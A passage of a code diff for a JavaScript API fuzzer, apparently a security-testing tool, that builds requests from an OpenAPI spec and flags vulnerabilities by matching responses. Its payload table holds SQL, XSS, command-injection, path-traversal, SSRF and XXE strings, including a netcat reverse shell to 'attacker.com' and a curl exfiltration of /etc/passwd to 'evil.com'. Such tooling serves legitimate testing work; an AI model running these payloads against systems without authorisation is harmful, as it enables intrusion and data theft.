@@ -1,629 +1,1316 @@
+// super_fuzzer_refactored.js - ПОЛНАЯ ВЕРСИЯ (ВСЕ PAYLOADS СОХРАНЕНЫ)
 import axios from 'axios';
 import fs from 'fs';
 import path from 'path';
 import { fileURLToPath } from 'url';
 import { faker } from '@faker-js/faker';
 import yaml from 'js-yaml';
-import { createLogger, format, transports } from 'winston';
+import { randomUUID } from 'crypto';
 import StructureMutator from './structureMutator.js';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
-const LOG_DIR = process.env.LOG_DIR || './logs';
 
-// ==================== ЛОГГЕР ====================
+// ==================== НАСТРОЙКИ ЛОГИРОВАНИЯ ====================
+const FUZZ_LOG_DIR = './temp/fuzz';
+const SESSION_ID = randomUUID();
+const LOG_FILE = path.join(FUZZ_LOG_DIR, `${SESSION_ID}-log.txt`);
 
-if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR, { recursive: true });
+if (!fs.existsSync(FUZZ_LOG_DIR)) {
+  fs.mkdirSync(FUZZ_LOG_DIR, { recursive: true });
+}
 
-const logger = createLogger({
-  level: process.env.NODE_ENV === 'development' ? 'debug' : 'info',
-  format: format.combine(
-    format.timestamp({ format: 'YYYY-MM-DD HH:mm:ss' }),
-    format.errors({ stack: true }),
-    format.splat(),
-    format.json()
-  ),
-  transports: [
-    new transports.File({ filename: path.join(LOG_DIR, 'error.log'), level: 'error' }),
-    new transports.File({ filename: path.join(LOG_DIR, 'combined.log') })
+function writeLog(level, message, data = null) {
+  const timestamp = new Date().toISOString();
+  let logEntry = `[${timestamp}] [${level.toUpperCase()}] ${message}`;
+  
+  if (data !== null) {
+    if (typeof data === 'object') {
+      try {
+        logEntry += `\n${JSON.stringify(data, null, 2)}`;
+      } catch (e) {
+        logEntry += `\n${String(data)}`;
+      }
+    } else {
+      logEntry += `\n${String(data)}`;
+    }
+  }
+  
+  logEntry += '\n' + '='.repeat(80) + '\n';
+  
+  try {
+    fs.appendFileSync(LOG_FILE, logEntry, 'utf8');
+  } catch (err) {
+    console.error(`Ошибка записи лога: ${err.message}`);
+  }
+}
+
+writeLog('info', `🚀 ЗАПУСК SUPER FUZZER`);
+writeLog('info', `📋 SESSION ID: ${SESSION_ID}`);
+writeLog('info', `📁 Лог файл: ${LOG_FILE}`);
+
+// ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================
+const safeStringify = (obj, maxLength = 200) => {
+  if (!obj) return '';
+  if (typeof obj === 'string') return obj.substring(0, maxLength);
+  if (typeof obj === 'number') return String(obj);
+  if (typeof obj === 'boolean') return String(obj);
+  if (typeof obj === 'object') {
+    try {
+      const str = JSON.stringify(obj);
+      return str.substring(0, maxLength);
+    } catch (e) {
+      return String(obj).substring(0, maxLength);
+    }
+  }
+  return String(obj).substring(0, maxLength);
+};
+
+const safeSubstring = (str, start, end) => {
+  if (!str || typeof str !== 'string') return '';
+  return str.substring(start, end || start + 100);
+};
+
+// ==================== КОНФИГУРАЦИЯ ====================
+const CONFIG = {
+  REQUEST_TIMEOUT: 5000,
+  MAX_RETRIES: 2,
+  RETRY_DELAY: 1000,
+  MAX_RESPONSE_SIZE: 10 * 1024 * 1024,
+  CONCURRENCY: 10,
+  MUTATION_DEPTH: 5,
+  EXTREME_MUTATION_COUNT: 2
+};
+
+// ==================== PAYLOADS БАЗА ДАННЫХ (ПОЛНАЯ) ====================
+const PAYLOADS = {
+  sql: {
+    error_based: [
+      "'", "''", "' OR '1'='1", "' OR 1=1--", "1' AND '1'='1",
+      "1' AND '1'='2", "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
+      "'; DROP TABLE users--", "' AND SLEEP(5)--", "' WAITFOR DELAY '00:00:05'",
+      "1' AND 1=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE SLEEP(5))--"
+    ],
+    boolean_based: [
+      "' AND '1'='1", "' AND '1'='2", "1' AND 1=1--", "1' AND 1=2--",
+      "' OR '1'='1'--", "' OR '1'='2'--"
+    ],
+    time_based: [
+      "' AND SLEEP(5)--", "' OR SLEEP(5)--", "'; WAITFOR DELAY '00:00:05'--",
+      "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+    ]
+  },
+  xss: {
+    reflected: [
+      "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
+      "<svg onload=alert(1)>", "javascript:alert(1)", "\"><script>alert(1)</script>",
+      "'><script>alert(1)</script>", "</script><script>alert(1)</script>",
+      "<body onload=alert(1)>", "<input onfocus=alert(1) autofocus>"
+    ],
+    dom_based: [
+      "\"><img src=x onerror=alert(1)>", "javascript:alert(document.cookie)",
+      "{{constructor.constructor('alert(1)')()}}", "${alert(1)}"
+    ],
+    blind: [
+      "<script src='https://collaborator.com/xss.js'></script>",
+      "<img src='https://collaborator.com/xss.png'>"
+    ]
+  },
+  command: {
+    linux: [
+      "; ls", "| cat /etc/passwd", "|| whoami", "& id", "&& uname -a",
+      "$(pwd)", "`pwd`", "; nc -e /bin/sh attacker.com 4444",
+      "| curl http://evil.com/steal?data=`cat /etc/passwd`"
+    ],
+    windows: [
+      "; dir", "| type C:\\Windows\\win.ini", "& whoami", "&& ipconfig",
+      "| powershell -c \"Get-ChildItem\""
+    ],
+    bypass: [
+      "cAt /Etc/PaSsWd", "c\"a\"t /etc/passwd", "ca$()t /etc/passwd",
+      "${IFS}cat${IFS}/etc/passwd"
+    ]
+  },
+  path: {
+    linux: [
+      "../../../etc/passwd", "../../../../etc/passwd", "../../../../../etc/passwd",
+      "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "..%252f..%252f..%252fetc%252fpasswd"
+    ],
+    windows: [
+      "..\\..\\..\\windows\\win.ini", "..\\..\\..\\..\\windows\\win.ini",
+      "..\\..\\..\\boot.ini", "....\\....\\....\\windows\\win.ini"
+    ]
+  },
+  ssrf: {
+    cloud_metadata: [
+      "http://169.254.169.254/latest/meta-data/",
+      "http://metadata.google.internal/computeMetadata/v1/",
+      "http://100.100.100.200/latest/meta-data/"
+    ],
+    internal: [
+      "http://localhost:80", "http://localhost:8080", "http://127.0.0.1:22",
+      "http://127.0.0.1:3306", "http://internal-admin.local/"
+    ],
+    file: [
+      "file:///etc/passwd", "file:///c:/windows/win.ini",
+      "gopher://localhost:8080", "dict://localhost:11211"
+    ]
+  },
+  nosql: {
+    operators: [
+      '{"$ne": null}', '{"$gt": ""}', '{"$regex": ".*"}', '{"$or": []}',
+      '{"$where": "1==1"}', '{"$ne": ""}', '{"$exists": true}'
+    ],
+    string: [
+      "admin' && this.password.match(/.*/)//",
+      "username[$ne]=null&password[$ne]=null"
+    ]
+  },
+  header: {
+    crlf: [
+      "test\r\nX-Injected: true", "test\nX-Injected: true",
+      "%0d%0aX-Injected:%20true", "test%0d%0aSet-Cookie:%20injected=1"
+    ],
+    host: ["evil.com", "localhost:8080", "127.0.0.1", "169.254.169.254"],
+    xss: ["<script>alert(1)</script>", "' OR '1'='1", "../../../etc/passwd"]
+  },
+  xxe: [
+    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
+    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>',
+    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>'
   ],
-});
-
-// ==================== КОНСТАНТЫ ====================
-
-const DEFAULT_OPTIONS = {
-  timeout: 5000,
-  concurrency: 5,
-  maxRetries: 2,
-  retryDelay: 1000,
-  maxResponseSize: 10 * 1024 * 1024,
-  format: 'auto'
+  graphql: [
+    '{__typename}',
+    '{users{password}}',
+    'query {__typename}',
+    'query {users{id username password}}',
+    'mutation {__typename}',
+    '{__schema{types{name fields{name}}}}'
+  ],
+  soap: [
+    '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetUser><id>1</id></GetUser></soap:Body></soap:Envelope>',
+    '<?xml version="1.0"?><soap:Envelope><soap:Body><Union>SELECT * FROM users</Union></soap:Body></soap:Envelope>',
+    '<soap:Envelope><soap:Body><Login><username>admin\' OR \'1\'=\'1</username><password>anything</password></Login></soap:Body></soap:Envelope>'
+  ],
+  large: {
+    strings: [
+      'A'.repeat(10000), 'B'.repeat(20000), '%00'.repeat(5000),
+      '🔥'.repeat(3000), 'A'.repeat(10000) + '../'.repeat(1000)
+    ],
+    numbers: ['999999999999999999999', '-1', '0', '1e309', 'NaN', 'Infinity']
+  }
 };
 
-const INJECTION_PAYLOADS = [
-  "' OR 1=1--",
-  "<script>alert(1)</script>",
-  "; ls -la;",
-  "../../../../etc/passwd",
-  "' UNION SELECT NULL--",
-  "'; DROP TABLE users; --",
-  "<img src=x onerror=alert(1)>",
-  "${7*7}",
-  "'; exec xp_cmdshell('dir'); --"
-];
+// ==================== ДЕТЕКТОР УЯЗВИМОСТЕЙ (ПОЛНЫЙ) ====================
+class VulnerabilityDetector {
+  constructor() {
+    this.patterns = this.initPatterns();
+    this.foundVulnerabilities = new Set();
+  }
 
-const LARGE_PAYLOAD_VARIANTS = [
-  (size = 10000) => 'A'.repeat(size),
-  (size = 20000) => 'B'.repeat(size),
-  (size = 5000) => '%00'.repeat(size),
-  (size = 3000) => '🔥'.repeat(size),
-  (size = 10000) => 'A'.repeat(size) + '../'.repeat(1000),
-  () => '{"a":' + '"A".repeat(5000)' + '}',
-  (size = 1000) => Array(size).fill('x').join('')
-];
+  initPatterns() {
+    return {
+      sql: [
+        { pattern: /SQL syntax.*MySQL/i, severity: 'critical', type: 'MySQL SQL Injection' },
+        { pattern: /You have an error in your SQL syntax/i, severity: 'critical', type: 'SQL Injection' },
+        { pattern: /ORA-\d{5}/i, severity: 'critical', type: 'Oracle SQL Injection' },
+        { pattern: /PostgreSQL.*ERROR/i, severity: 'critical', type: 'PostgreSQL SQL Injection' },
+        { pattern: /SQLite.*syntax error/i, severity: 'critical', type: 'SQLite SQL Injection' },
+        { pattern: /unclosed quotation mark/i, severity: 'critical', type: 'MSSQL Injection' },
+        { pattern: /Microsoft.*ODBC/i, severity: 'critical', type: 'ODBC SQL Injection' },
+        { pattern: /Division by zero in SQL/i, severity: 'high', type: 'SQL Error Based' },
+        { pattern: /Column.*not found/i, severity: 'medium', type: 'SQL Column Discovery' },
+        { pattern: /Table.*doesn't exist/i, severity: 'medium', type: 'SQL Table Discovery' },
+        { pattern: /Unknown column/i, severity: 'medium', type: 'SQL Column Discovery' },
+        { pattern: /Duplicate entry/i, severity: 'low', type: 'SQL Information Leak' },
+        { pattern: /Data too long for column/i, severity: 'low', type: 'SQL Truncation' },
+        { pattern: /warning.*mysql/i, severity: 'low', type: 'SQL Warning Disclosure' }
+      ],
+      xss: [
+        { pattern: /<script[^>]*>.*?<\/script>/i, severity: 'high', type: 'Reflected XSS' },
+        { pattern: /alert\([^)]*\)/i, severity: 'high', type: 'XSS - Alert' },
+        { pattern: /confirm\([^)]*\)/i, severity: 'high', type: 'XSS - Confirm' },
+        { pattern: /prompt\([^)]*\)/i, severity: 'high', type: 'XSS - Prompt' },
+        { pattern: /onerror\s*=\s*["']?[^"'>]*/i, severity: 'high', type: 'XSS - Event Handler' },
+        { pattern: /onload\s*=\s*["']?[^"'>]*/i, severity: 'high', type: 'XSS - Event Handler' },
+        { pattern: /onclick\s*=\s*["']?[^"'>]*/i, severity: 'high', type: 'XSS - Event Handler' },
+        { pattern: /onmouseover\s*=\s*["']?[^"'>]*/i, severity: 'high', type: 'XSS - Event Handler' },
+        { pattern: /javascript:/i, severity: 'high', type: 'XSS - Protocol' },
+        { pattern: /<img[^>]+onerror=/i, severity: 'high', type: 'XSS - Image Error' },
+        { pattern: /<svg[^>]+onload=/i, severity: 'high', type: 'XSS - SVG Vector' },
+        { pattern: /<body[^>]+onload=/i, severity: 'high', type: 'XSS - Body Load' },
+        { pattern: /<input[^>]+onfocus=/i, severity: 'high', type: 'XSS - Input Focus' },
+        { pattern: /<iframe[^>]+src=/i, severity: 'high', type: 'XSS - Iframe' },
+        { pattern: /<object[^>]+data=/i, severity: 'high', type: 'XSS - Object' },
+        { pattern: /<embed[^>]+src=/i, severity: 'high', type: 'XSS - Embed' },
+        { pattern: /<link[^>]+href=/i, severity: 'medium', type: 'XSS - Link' }
+      ],
+      command: [
+        { pattern: /uid=\d+\([^)]+\)/i, severity: 'critical', type: 'Command Injection - User Info' },
+        { pattern: /gid=\d+\([^)]+\)/i, severity: 'critical', type: 'Command Injection - Group Info' },
+        { pattern: /root:[^:]*:[^:]*:/i, severity: 'critical', type: 'Command Injection - Password File' },
+        { pattern: /Directory of/i, severity: 'high', type: 'Command Injection - Directory Listing' },
+        { pattern: /Volume Serial Number/i, severity: 'medium', type: 'Command Injection - Volume Info' },
+        { pattern: /Total Files:/i, severity: 'medium', type: 'Command Injection - File Count' },
+        { pattern: /[A-Z]:\\/i, severity: 'high', type: 'Command Injection - Windows Path' },
+        { pattern: /\/home\/[a-z]+/i, severity: 'high', type: 'Command Injection - Linux Path' },
+        { pattern: /\/etc\/passwd/i, severity: 'critical', type: 'Command Injection - Passwd Access' },
+        { pattern: /C:\\Windows\\System32/i, severity: 'high', type: 'Command Injection - System32 Access' },
+        { pattern: /whoami/i, severity: 'high', type: 'Command Injection - User Discovery' },
+        { pattern: /hostname/i, severity: 'medium', type: 'Command Injection - Hostname Discovery' }
+      ],
+      path: [
+        { pattern: /root:[^:]*:[^:]*:/i, severity: 'high', type: 'Path Traversal - Passwd' },
+        { pattern: /\[extensions\]/i, severity: 'medium', type: 'Path Traversal - Win.ini' },
+        { pattern: /boot\.ini/i, severity: 'high', type: 'Path Traversal - Boot Config' },
+        { pattern: /\[fonts\]/i, severity: 'medium', type: 'Path Traversal - Fonts' },
+        { pattern: /\[mail\]/i, severity: 'medium', type: 'Path Traversal - Mail Config' },
+        { pattern: /\[MCI\]/i, severity: 'low', type: 'Path Traversal - MCI Config' },
+        { pattern: /\/etc\/shadow/i, severity: 'critical', type: 'Path Traversal - Shadow File' },
+        { pattern: /\/etc\/hosts/i, severity: 'medium', type: 'Path Traversal - Hosts File' },
+        { pattern: /\/var\/log/i, severity: 'medium', type: 'Path Traversal - Log Files' }
+      ],
+      ssrf: [
+        { pattern: /\"instanceId\"/i, severity: 'critical', type: 'SSRF - AWS Metadata' },
+        { pattern: /\"hostname\".*\"project-id\"/i, severity: 'critical', type: 'SSRF - GCP Metadata' },
+        { pattern: /\"availability_zone\"/i, severity: 'high', type: 'SSRF - Cloud Metadata' },
+        { pattern: /\"secret-key\"/i, severity: 'critical', type: 'SSRF - Secret Key Leak' },
+        { pattern: /169\.254\.169\.254/i, severity: 'critical', type: 'SSRF - AWS Metadata Access' },
+        { pattern: /metadata\.google\.internal/i, severity: 'critical', type: 'SSRF - GCP Metadata Access' },
+        { pattern: /localhost/i, severity: 'medium', type: 'SSRF - Localhost Access' },
+        { pattern: /127\.0\.0\.1/i, severity: 'medium', type: 'SSRF - Loopback Access' }
+      ],
+      nosql: [
+        { pattern: /\$ne/i, severity: 'high', type: 'NoSQL - $ne Operator' },
+        { pattern: /\$gt/i, severity: 'high', type: 'NoSQL - $gt Operator' },
+        { pattern: /\$regex/i, severity: 'high', type: 'NoSQL - $regex Operator' },
+        { pattern: /\$or/i, severity: 'high', type: 'NoSQL - $or Operator' },
+        { pattern: /\$where/i, severity: 'critical', type: 'NoSQL - $where Injection' }
+      ],
+      info_leak: [
+        { pattern: /api[_-]?key["\s:=]+[a-zA-Z0-9]{16,}/i, severity: 'critical', type: 'API Key Disclosure' },
+        { pattern: /secret["\s:=]+[a-zA-Z0-9]{16,}/i, severity: 'critical', type: 'Secret Disclosure' },
+        { pattern: /password["\s:=]+[^"\s]{4,}/i, severity: 'high', type: 'Password Disclosure' },
+        { pattern: /token["\s:=]+[a-zA-Z0-9]{16,}/i, severity: 'high', type: 'Token Disclosure' },
+        { pattern: /aws[_-]?access[_-]?key/i, severity: 'critical', type: 'AWS Key Disclosure' },
+        { pattern: /private[_-]?key/i, severity: 'critical', type: 'Private Key Disclosure' },
+        { pattern: /jwt["\s:=]+eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+\/=]*/i, severity: 'high', type: 'JWT Token Disclosure' },
+        { pattern: /mongodb:\/\/[^"\s]+/i, severity: 'critical', type: 'MongoDB Connection String' },
+        { pattern: /mysql:\/\/[^"\s]+/i, severity: 'critical', type: 'MySQL Connection String' },
+        { pattern: /postgresql:\/\/[^"\s]+/i, severity: 'critical', type: 'PostgreSQL Connection String' },
+        { pattern: /redis:\/\/[^"\s]+/i, severity: 'critical', type: 'Redis Connection String' }
+      ],
+      debug: [
+        { pattern: /stack trace/i, severity: 'medium', type: 'Stack Trace Disclosure' },
+        { pattern: /exception in/i, severity: 'medium', type: 'Exception Disclosure' },
+        { pattern: /debug mode/i, severity: 'low', type: 'Debug Mode Enabled' },
+        { pattern: /FLASK_ENV.*development/i, severity: 'low', type: 'Development Mode' },
+        { pattern: /DJANGO_DEBUG.*True/i, severity: 'low', type: 'Django Debug Mode' },
+        { pattern: /NODE_ENV.*development/i, severity: 'low', type: 'Node Dev Mode' },
+        { pattern: /RACK_ENV.*development/i, severity: 'low', type: 'Rack Dev Mode' },
+        { pattern: /RAILS_ENV.*development/i, severity: 'low', type: 'Rails Dev Mode' }
+      ],
+      xxe: [
+        { pattern: /file:\/\/\/etc\/passwd/i, severity: 'critical', type: 'XXE Injection - File Read' },
+        { pattern: /root:[^:]*:[^:]*:/i, severity: 'critical', type: 'XXE Injection - Passwd Content' },
+        { pattern: /DOCTYPE.*SYSTEM/i, severity: 'high', type: 'XXE Injection' }
+      ],
+      graphql: [
+        { pattern: /__typename/i, severity: 'medium', type: 'GraphQL Introspection' },
+        { pattern: /__schema/i, severity: 'medium', type: 'GraphQL Schema Leak' },
+        { pattern: /\"data\":\s*\{/i, severity: 'low', type: 'GraphQL Response' }
+      ],
+      soap: [
+        { pattern: /soap:Envelope/i, severity: 'low', type: 'SOAP Response' },
+        { pattern: /faultcode/i, severity: 'medium', type: 'SOAP Fault' }
+      ]
+    };
+  }
 
-const ID_BOUNDARY_VALUES = ['999999999999999999999', '-1', '0', '1e309', 'NaN', 'Infinity'];
+  detect(response, testCase) {
+    const vulnerabilities = [];
+    const responseText = typeof response?.data === 'string' ? response.data : JSON.stringify(response?.data || '');
+    const status = response?.status || 0;
+    const headers = response?.headers || {};
+    
+    const endpointKey = `${testCase.path}_${testCase.method}`;
+    
+    // CORS
+    if (headers['access-control-allow-origin'] === '*' && !this.foundVulnerabilities.has(`cors_${endpointKey}`)) {
+      this.foundVulnerabilities.add(`cors_${endpointKey}`);
+      vulnerabilities.push({
+        type: 'CORS Misconfiguration - Wildcard Origin',
+        severity: 'medium',
+        endpoint: testCase.path,
+        method: testCase.method,
+        response_status: status,
+        snippet: 'Access-Control-Allow-Origin: * allows any domain'
+      });
+    }
+    
+    // В методе detect, после CORS проверки, добавить:
 
-const RETRYABLE_ERRORS = ['ECONNRESET', 'ETIMEDOUT', 'ECONNABORTED'];
+// ========== ДЕТЕКЦИЯ УЯЗВИМОСТЕЙ В ЗАГОЛОВКАХ ==========
 
-const EXPECTED_STATUS = {
-  normal: [200, 201, 202, 204],
-  injection: [400, 401, 403, 404, 422, 500],
-  large: [400, 413, 500],
-  mutation: [400, 422, 500],
-  header_fuzzing: [400, 401, 403]
-};
+// Проверка на CRLF инъекцию в ответе
+if (testCase.type === 'header_mutation' && testCase.headers) {
+    const headers = testCase.headers;
+    
+    // Проверка на успешную CRLF инъекцию
+    if (responseText.includes('X-Injected') || 
+        responseText.includes('Set-Cookie') ||
+        headers['User-Agent']?.includes('\r\n') && responseText.includes('X-Injected')) {
+        const key = `header_crlf_${endpointKey}`;
+        if (!this.foundVulnerabilities.has(key)) {
+            this.foundVulnerabilities.add(key);
+            vulnerabilities.push({
+                type: 'CRLF Injection - Header Injection Successful',
+                severity: 'high',
+                category: 'header',
+                endpoint: testCase.path,
+                method: testCase.method,
+                payload: safeStringify(testCase.payload, 200),
+                response_status: status,
+                snippet: 'CRLF injection payload reflected in response'
+            });
+        }
+    }
+    
+    // Проверка на большие заголовки (DoS)
+    for (const [key, value] of Object.entries(testCase.headers)) {
+        if (typeof value === 'string' && value.length > 10000) {
+            const largeKey = `header_large_${endpointKey}`;
+            if (!this.foundVulnerabilities.has(largeKey)) {
+                this.foundVulnerabilities.add(largeKey);
+                vulnerabilities.push({
+                    type: 'Large Header - Possible DoS',
+                    severity: 'medium',
+                    category: 'header',
+                    endpoint: testCase.path,
+                    method: testCase.method,
+                    payload: `Header ${key} size: ${value.length}`,
+                    response_status: status,
+                    snippet: `Server accepted header of size ${value.length}`
+                });
+            }
+            break;
+        }
+    }
+    
+    // Проверка на неожиданные типы в заголовках
+    for (const [key, value] of Object.entries(testCase.headers)) {
+        if (value === null || value === undefined || typeof value === 'object') {
+            const typeKey = `header_type_${endpointKey}`;
+            if (!this.foundVulnerabilities.has(typeKey)) {
+                this.foundVulnerabilities.add(typeKey);
+                vulnerabilities.push({
+                    type: 'Unexpected Header Type - Null/Undefined/Object',
+                    severity: 'medium',
+                    category: 'header',
+                    endpoint: testCase.path,
+                    method: testCase.method,
+                    payload: `Header ${key} has type ${typeof value}`,
+                    response_status: status,
+                    snippet: `Server accepted ${typeof value} as header value`
+                });
+            }
+            break;
+        }
+    }
+    
+    // Проверка на 500 ошибку (краш от заголовков)
+    if (status === 500) {
+        const crashKey = `header_crash_${endpointKey}`;
+        if (!this.foundVulnerabilities.has(crashKey)) {
+            this.foundVulnerabilities.add(crashKey);
+            vulnerabilities.push({
+                type: 'Header Injection - Server Crash',
+                severity: 'high',
+                category: 'header',
+                endpoint: testCase.path,
+                method: testCase.method,
+                payload: safeStringify(testCase.payload, 200),
+                response_status: status,
+                snippet: 'Server crashed on malicious headers'
+            });
+        }
+    }
+}
+    // Проверка всех категорий
+    for (const [category, patterns] of Object.entries(this.patterns)) {
+      for (const pattern of patterns) {
+        if (pattern.pattern.test(responseText)) {
+          const key = `${category}_${endpointKey}_${pattern.type}`;
+          if (!this.foundVulnerabilities.has(key)) {
+            this.foundVulnerabilities.add(key);
+            vulnerabilities.push({
+              type: pattern.type,
+              severity: pattern.severity,
+              category: category,
+              endpoint: testCase.path,
+              method: testCase.method,
+              payload: safeStringify(testCase.payload, 200),
+              response_status: status,
+              snippet: safeSubstring(responseText, 0, 300)
+            });
+          }
+          break;
+        }
+      }
+    }
+    
+    return vulnerabilities;
+  }
 
-// ==================== ОСНОВНОЙ КЛАСС ====================
+  resetDetections() {
+    this.foundVulnerabilities.clear();
+  }
+}
 
+
+// ==================== ОСНОВНОЙ КЛАСС ФАЗЗЕРА ====================
 class APIFuzzer {
   constructor(swaggerFile, options = {}) {
     this.swaggerFile = swaggerFile;
     this.baseUrl = options.baseUrl || '';
-    this.timeout = options.timeout || DEFAULT_OPTIONS.timeout;
-    this.concurrency = options.concurrency || DEFAULT_OPTIONS.concurrency;
-    this.maxRetries = options.maxRetries || DEFAULT_OPTIONS.maxRetries;
-    this.retryDelay = options.retryDelay || DEFAULT_OPTIONS.retryDelay;
-    this.maxResponseSize = options.maxResponseSize || DEFAULT_OPTIONS.maxResponseSize;
-    this.format = options.format || DEFAULT_OPTIONS.format;
-    
-    this.results = [];
+    this.timeout = options.timeout || CONFIG.REQUEST_TIMEOUT;
+    this.concurrency = options.concurrency || CONFIG.CONCURRENCY;
     this.spec = null;
     this.testCases = [];
+    this.results = [];
+    this.detector = new VulnerabilityDetector();
     this.mutator = new StructureMutator();
     this.startTime = null;
-    
-    this._counters = this._initCounters();
+    this.stats = { total: 0, completed: 0, vulnerabilities: 0 };
   }
 
-  _initCounters() {
-    return {
-      rateLimit: {},
-      rateLimitRamp: {},
-      injection: {},
-      header: {},
-      large: {},
-      mutation: {},
-      leak: {},
-      resource: {},
-      protocol: {},
-      boundary: {},
-      cache: {},
-      timeout: {},
-      encoding: {}
-    };
+  // Извлечение path параметров из URL
+  extractPathParams(pathUrl) {
+    const matches = pathUrl.match(/\{([^}]+)\}/g);
+    if (!matches) return [];
+    return matches.map(m => m.slice(1, -1));
   }
 
-  // ==================== ЗАГРУЗКА СПЕЦИФИКАЦИИ ====================
+  // Интерполяция URL с path параметрами
+  interpolateUrl(url, pathParams) {
+    let result = url;
+    for (const [key, value] of Object.entries(pathParams || {})) {
+      result = result.replace(`{${key}}`, encodeURIComponent(String(value)));
+    }
+    return result;
+  }
 
   async loadSpec() {
-    const ext = path.extname(this.swaggerFile).toLowerCase();
+    writeLog('info', '📖 Загрузка Swagger спецификации...');
     const content = fs.readFileSync(this.swaggerFile, 'utf8');
-
-    if (this.format === 'yaml' || ext === '.yaml' || ext === '.yml') {
-      this.spec = yaml.load(content);
-    } else if (this.format === 'json' || ext === '.json') {
-      this.spec = JSON.parse(content);
-    } else {
-      try { 
-        this.spec = JSON.parse(content); 
-      } catch { 
-        this.spec = yaml.load(content); 
-      }
-    }
-
+    const ext = path.extname(this.swaggerFile).toLowerCase();
+    
+    this.spec = (ext === '.yaml' || ext === '.yml') ? yaml.load(content) : JSON.parse(content);
+    
     if (!this.spec.openapi && !this.spec.swagger) {
-      throw new Error('Не валидная OpenAPI/Swagger спецификация');
+      throw new Error('Невалидная OpenAPI/Swagger спецификация');
     }
-
+    
+    writeLog('info', `✅ Загружена: ${this.spec.info?.title || 'Unknown'} v${this.spec.info?.version || '?'}`);
     return this.spec;
   }
 
-  // ==================== РАБОТА СО СХЕМАМИ ====================
+  generateNormalPayload(operation) {
+    const result = { query: {}, path: {}, body: null };
+    
+    // PATH параметры
+    const pathParams = this.extractPathParams(operation.path);
+    for (const paramName of pathParams) {
+      result.path[paramName] = faker.number.int({ min: 1, max: 100 });
+    }
+    
+    // QUERY параметры
+    const parameters = operation.parameters || [];
+    for (const param of parameters) {
+      if (param.in === 'query') {
+        result.query[param.name] = this.generatePayload(param.schema) ?? faker.string.alphanumeric(8);
+      }
+    }
+    
+    // BODY для POST/PUT/PATCH
+    if (operation.requestBody && ['post', 'put', 'patch'].includes(operation.method)) {
+      const schema = operation.requestBody?.content?.['application/json']?.schema;
+      if (schema) {
+        result.body = this.generatePayload(schema);
+      } else {
+        result.body = { test: 'data', id: faker.number.int({ min: 1, max: 100 }) };
+      }
+    }
+    
+    return result;
+  }
+
+  generatePayload(schema) {
+    if (!schema) return 'test';
+    if (schema.$ref) return this.generatePayload(this.resolveRef(schema.$ref));
+    if (schema.enum) return faker.helpers.arrayElement(schema.enum);
+
+    switch (schema.type) {
+      case 'string':
+        if (schema.format === 'email') return faker.internet.email();
+        if (schema.format === 'uuid') return faker.string.uuid();
+        return faker.string.alphanumeric(8);
+      case 'integer':
+        return faker.number.int({ min: schema.minimum || 1, max: schema.maximum || 1000 });
+      case 'boolean':
+        return faker.datatype.boolean();
+      case 'object':
+        if (schema.properties) {
+          const obj = {};
+          for (const [k, v] of Object.entries(schema.properties)) {
+            obj[k] = this.generatePayload(v);
+          }
+          return obj;
+        }
+        return {};
+      case 'array':
+        const count = faker.number.int({ min: 1, max: 3 });
+        return Array(count).fill().map(() => this.generatePayload(schema.items));
+      default:
+        return 'test';
+    }
+  }
 
   resolveRef(ref) {
-    if (!ref?.startsWith('#/')) return null;
+    if (!ref || !ref.startsWith('#/')) return null;
     let current = this.spec;
-    for (const part of ref.replace('#/', '').split('/')) {
+    const parts = ref.replace('#/', '').split('/');
+    for (const part of parts) {
       current = current?.[part];
     }
     return current;
   }
 
-  generatePayload(schema) {
-    if (!schema) return null;
-    if (schema.$ref) return this.generatePayload(this.resolveRef(schema.$ref));
-    if (schema.enum) return faker.helpers.arrayElement(schema.enum);
-
-    switch (schema.type) {
-      case 'string': return this._generateString(schema);
-      case 'integer': return this._generateInteger(schema);
-      case 'number': return this._generateNumber(schema);
-      case 'boolean': return faker.datatype.boolean();
-      case 'object': return this._generateObject(schema);
-      case 'array': return this._generateArray(schema);
-      default: return null;
-    }
-  }
-
-  _generateString(schema) {
-    if (schema.format === 'email') return faker.internet.email();
-    if (schema.format === 'uuid') return faker.string.uuid();
-    if (schema.format === 'date') return faker.date.past().toISOString().split('T')[0];
-    if (schema.format === 'date-time') return faker.date.past().toISOString();
-    if (schema.minLength && schema.maxLength) {
-      const length = faker.number.int({ min: schema.minLength, max: Math.min(schema.maxLength, 100) });
-      return faker.string.alphanumeric(length);
-    }
-    return faker.string.alphanumeric(8);
-  }
-
-  _generateInteger(schema) {
-    if (schema.minimum && schema.maximum) {
-      return faker.number.int({ min: schema.minimum, max: schema.maximum });
-    }
-    return faker.number.int({ min: 1, max: 1000 });
-  }
-
-  _generateNumber(schema) {
-    if (schema.minimum && schema.maximum) {
-      return faker.number.float({ min: schema.minimum, max: schema.maximum });
-    }
-    return faker.number.float({ min: 1, max: 1000 });
-  }
-
-  _generateObject(schema) {
-    if (!schema.properties) return {};
-    const obj = {};
-    for (const [k, v] of Object.entries(schema.properties)) {
-      if (!schema.required || schema.required.includes(k) || Math.random() > 0.3) {
-        obj[k] = this.generatePayload(v);
-      }
-    }
-    return Object.keys(obj).length ? obj : { fuzz: faker.string.alphanumeric(6) };
-  }
-
-  _generateArray(schema) {
-    const minItems = schema.minItems || 1;
-    const maxItems = Math.min(schema.maxItems || 3, 5);
-    const count = faker.number.int({ min: minItems, max: maxItems });
-    return Array(count).fill().map(() => this.generatePayload(schema.items));
-  }
-
-  // ==================== URL ОБРАБОТКА ====================
-
